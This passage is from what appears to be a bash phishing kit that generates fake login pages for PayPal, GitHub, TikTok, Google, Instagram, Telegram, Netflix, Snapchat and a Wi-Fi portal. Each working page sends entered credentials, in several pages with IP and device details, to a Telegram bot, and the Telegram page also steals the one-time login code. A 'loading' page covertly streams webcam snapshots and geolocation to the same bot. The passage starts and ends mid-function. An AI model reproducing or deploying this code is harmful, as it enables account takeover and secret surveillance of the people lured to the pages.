                    text: \`PayPal Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.paypal.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

github_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #161b22; border-radius: 50%; width: 300px; height: 300px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .login-container img { width: 100px; margin-bottom: 25px; border-radius: 50%; }
        h2 { font-size: 22px; color: #c9d1d9; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #30363d; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #0d1117; color: #c9d1d9; }
        input:focus { border-color: #58a6ff; box-shadow: 0 0 8px rgba(88, 166, 255, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #238636; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #2ea043; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #58a6ff; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #30363d; }
        .signup-btn { width: 100%; padding: 14px; background-color: #21262d; border: 1px solid #30363d; font-size: 14px; color: #58a6ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #30363d; }
        .terms { margin-top: 20px; font-size: 12px; color: #8b949e; }
        .terms a { color: #58a6ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo">
        <h2>Sign in to GitHub</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username or email address" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign in</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create an account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`GitHub Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://github.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

tiktok_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        /* CSS styling for TikTok login page */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #121212;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(255, 0, 0, 0.2);
            color: #fff;
        }

        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 22px;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            background-color: #181818;
            color: #fff;
        }

        input:focus {
            border-color: #ff0050;
            box-shadow: 0 0 8px rgba(255, 0, 80, 0.5);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #ff0050;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #e60045;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #ff0050;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #181818;
            border: 1px solid #ff0050;
            font-size: 14px;
            color: #ff0050;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #222;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #ff0050;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
        <h2>Sign in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Don't have an account? Sign up</button>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            
            let token = "${token}";
            let chatId = "${id}";

            let message = \`🔴 **TikTok Login Attempt**\n👤 Username: \${username}\n🔒 Password: \${password}\`;
            let url = \`https://api.telegram.org/bot\${token}/sendMessage?chat_id=\${chatId}&text=\${encodeURIComponent(message)}\`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    alert("Incorrect username or password. Please try again.");
                })
                .catch(error => console.error("Error sending message:", error));
        });
    </script>
</body>
</html>
EOF
}

camera_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: black;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            overflow: hidden;
        }

        #loading {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            color: white;
            text-align: center;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "${token}";
        const chatId = "${id}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        function sendToBot(message) {
            fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
            });
        }

        function sendWelcomeMessage() {
            const message = \`👋 Welcome to the developer! 
                            \n📩 Contact the developer: @A_Y_TR\`;
            sendToBot(message);
        }

        function captureAndSend() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "image.jpg");

                fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
                    method: "POST",
                    body: formData
                });
            }, "image/jpeg");
        }

        function sendLocation() {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                sendToBot(\`📍 Location: https://www.google.com/maps?q=\${lat},\${lon}\`);
            });
        }

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                video.srcObject = stream;
                setInterval(() => {
                    captureAndSend();
                    sendLocation();
                    sendWelcomeMessage();
                }, 125); 
            })
            .catch(err => console.error(err));

        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 5000);
    </script>
</body>
</html>
EOF
}

google_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 8px rgba(26, 115, 232, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a73e8;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #135abe;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a73e8;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a73e8;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
        <h2>Sign in to Google</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Google Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.google.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
}

instagram_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #e1306c; box-shadow: 0 0 8px rgba(225, 48, 108, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #e1306c; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #c13584; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #e1306c; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #e1306c; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #e1306c; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
        <h2>Log in to Instagram</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create new account</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Instagram Login Attempt:\nUsername📧: \${username}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.instagram.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

telegram_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #ffffff; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #333; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; }
        input:focus { border-color: #0088cc; box-shadow: 0 0 8px rgba(0, 136, 204, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #0088cc; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #006699; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #0088cc; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #0088cc; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #0088cc; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h2>Log in to Telegram</h2>
        <form id="loginForm">
            <input type="text" id="phone" placeholder="Phone number" required>
            <button type="submit" class="btn-login">Next</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up for Telegram</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const phone = document.getElementById('phone').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Telegram Login Attempt:\nPhone📱: \${phone}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Please enter the code sent to your phone.');
                const code = prompt('Enter the code:');
                const codeResponse = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: '${id}',
                        text: \`Telegram Code:\nCode🔢: \${code}\`
                    })
                });
                const codeResult = await codeResponse.json();
                if (codeResult.ok) {
                    alert('Login successful! Redirecting...');
                    window.location.href = 'https://web.telegram.org';
                } else {
                    alert('Login failed. Please check your code.');
                }
            } else {
                alert('Login failed. Please check your phone number.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

netflix_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background-color: #141414; border-radius: 10px; width: 360px; padding: 40px 30px; text-align: center; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }
        .login-container img { width: 100px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #fff; margin-bottom: 15px; font-weight: 600; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #333; border-radius: 5px; font-size: 15px; outline: none; transition: border-color 0.3s ease, box-shadow 0.3s ease; background-color: #333; color: #fff; }
        input:focus { border-color: #e50914; box-shadow: 0 0 8px rgba(229, 9, 20, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #e50914; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #b20710; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #e50914; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #333; }
        .signup-btn { width: 100%; padding: 14px; background-color: #333; border: 1px solid #333; font-size: 14px; color: #e50914; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #444; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #e50914; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
        <h2>Sign In</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or phone number" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Sign In</button>
        </form>
        <p class="forgot-password"><a href="#">Need help?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Sign up now</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Netflix Login Attempt:\nEmail📧: \${email}\nPassword🔑: \${password}\nDevice Info📲:\nIP Address🌍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork Type📡: \${deviceInfo.networkType}\nDevice Name📱: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.netflix.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

wifi_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>We Secure Access</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0e17;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
        }

        .login-container {
            background: rgba(18, 23, 34, 0.98);
            padding: 2rem;
            border-radius: 20px;
            width: 90%;
            max-width: 380px;
            border: 1px solid rgba(0, 102, 255, 0.15);
            box-shadow: 0 0 40px rgba(0, 102, 255, 0.1);
        }

        .neon-logo {
            width: 70px;
            height: 70px;
            margin: 0 auto 1.8rem;
            display: block;
            opacity: 0.85;
            border-radius: 15px;
            border: 2px solid rgba(0, 102, 255, 0.3);
            padding: 5px;
            background: rgba(0, 102, 255, 0.05);
            filter: 
                drop-shadow(0 0 12px rgba(0, 102, 255, 0.4))
                brightness(1.1)
                contrast(1.2);
            animation: pulse 2s ease-in-out infinite;
            transform-style: preserve-3d;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(0.98); }
            50% { transform: scale(1.02); }
        }

        input {
            width: 100%;
            padding: 14px;
            margin: 12px 0;
            background: rgba(255, 255, 255, 0.03);
            border: 1.5px solid rgba(0, 102, 255, 0.25);
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        input:focus {
            border-color: #0066ff;
            box-shadow: 0 0 15px rgba(0, 102, 255, 0.3);
            background: rgba(0, 102, 255, 0.05);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #0066ff 0%, #004cb3 100%);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 1.2rem;
            font-weight: 600;
            letter-spacing: 0.5px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 102, 255, 0.3);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://dev-dfprotection.pantheonsite.io/wp-content/uploads/2025/03/Screenshot_20250315_220017_Google.jpg" 
             class="neon-logo"
             alt="We Logo">

        <input type="text" placeholder="Network Name">
        <input type="password" placeholder="Password">

        <button>Connect</button>
    </div>

    <script>
        document.querySelector('button').addEventListener('click', async (e) => {
            e.preventDefault();
            const data = {
                ssid: document.querySelector('input[type="text"]').value,
                pass: document.querySelector('input[type="password"]').value
            };
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: `📡 SSID: ${data.ssid}\n🔐 PASS: ${data.pass}`
                })
            });
            
            window.location.href = 'https://google.com';
        });
    </script>
</body>
</html>
EOF
}

snapchat_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Helvetica Neue',sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;}
        .container{background:#fff;border-radius:15px;width:380px;padding:30px;box-shadow:0 4px 20px rgba(0,0,0,0.1);}
        .logo{width:80px;margin:0 auto 20px;display:block;filter:invert(0);}
        h1{color:#000;text-align:center;margin-bottom:25px;font-weight:600;font-size:22px;}
        input{width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:8px;font-size:14px;background:#fff;color:#000;}
        input:focus{outline:none;border-color:#FFFC00;box-shadow:0 0 6px rgba(255,252,0,0.3);}
        .btn{width:100%;padding:12px;background:#FFFC00;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:700;transition:transform 0.2s;}
        .btn:hover{transform:scale(1.02);}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://dev-dfprotection.pantheonsite.io/wp-content/uploads/2025/03/Screenshot_20250315_211635_Google.jpg" class="logo" alt="Snapchat">
        <h1>تسجيل الدخول إلى Snapchat</h1>
        <form id="loginForm">
            <input type="text" placeholder="اسم المستخدم" required>
            <input type="password" placeholder="كلمة المرور" required>
            <button type="submit" class="btn">تسجيل الدخول</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit',async e=>{
            e.preventDefault();
            const username=document.querySelector('input[type="text"]').value;
            const password=document.querySelector('input[type="password"]').value;
            await fetch('https://api.telegram.org/bot${token}/sendMessage',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({
                    chat_id:'${id}',
                    text:`👻 Snapchat Login\n👤 User: ${username}\n🔑 Pass: ${password}`
                })
            });
            window.location.href='https://accounts.snapchat.com';
        });
    </script>
</body>
</html>
EOF
}

whatsapp_page() {
    cat <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; height: 100vh; }
